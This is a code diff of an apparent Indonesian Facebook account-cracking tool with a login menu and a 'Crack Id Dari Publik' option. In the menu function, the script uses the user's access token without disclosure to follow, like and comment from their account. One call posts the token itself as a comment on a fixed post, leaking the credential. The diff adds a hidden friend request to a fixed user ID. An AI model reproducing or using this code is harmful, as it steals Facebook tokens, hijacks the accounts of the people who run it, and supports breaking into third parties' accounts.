@@ -31,7 +31,7 @@ ok = []
 raka_sayang_amanda = '3882176535153442'
 def __raka_sayang_amanda__():
 	os.system('clear')
-	raka(_raka_banner_);time.sleep(00.1)
+	raka(_raka_banner_)
 	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Login Menggunakan Token Facebook")
 	raka("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Cara Mengambil Token Facebook")
 	raka("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Exit")
@@ -98,14 +98,15 @@ def __menu__():
                 pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
                 kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
                 komen3 = kata_utama3+"\n"+pantun_motivasi
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token=' +token)
                 requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
                 requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
                 requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
-                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
-                requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
-                requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
-                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
-                requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
+                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token=' +token)
+                requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=' +token)
+                requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token=' +token)
+                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token=' +token)
+                requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token=' +token)
                 requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
                 __raka_sayang_amanda__()
         try:
@@ -121,7 +122,7 @@ def __menu__():
         except requests.exceptions.ConnectionError:
 		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tidak ada koneksi internet");exit
         os.system('clear')
-	raka(_raka_banner_);time.sleep(00.1)
+	raka(_raka_banner_)
 	print("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama Account  : \033[0;36m" +name)
 	print("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
 	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Publik")
